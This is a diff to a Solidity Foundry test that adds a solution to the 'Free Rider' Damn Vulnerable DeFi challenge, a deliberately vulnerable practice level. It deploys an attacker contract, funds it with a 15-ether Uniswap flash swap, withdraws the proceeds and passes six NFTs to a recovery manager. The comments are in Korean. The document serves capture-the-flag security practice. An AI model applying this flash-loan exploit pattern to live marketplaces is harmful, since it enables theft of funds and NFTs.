@@ -12,6 +12,8 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import {FreeRiderAttacker} from "../../src/free-rider/FreeRiderAttacker.sol";
+
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -124,6 +126,15 @@ contract FreeRiderChallenge is Test {
      */
     function test_freeRider() public checkSolvedByPlayer {
         
+        FreeRiderAttacker attacker = new FreeRiderAttacker{ value: player.balance }(uniswapPair, marketplace);
+
+        // 유니스왑에서 15이더만큼 플래시론 실시
+        uniswapPair.swap(15 ether, 0, address(attacker), hex"00");
+        
+        // 공격 끝, 마무리
+        attacker.withdrawAll();
+        for (uint i = 0; i < 6; i++)
+            nft.safeTransferFrom(player, address(recoveryManager), i, abi.encode(player));
     }
 
     /**
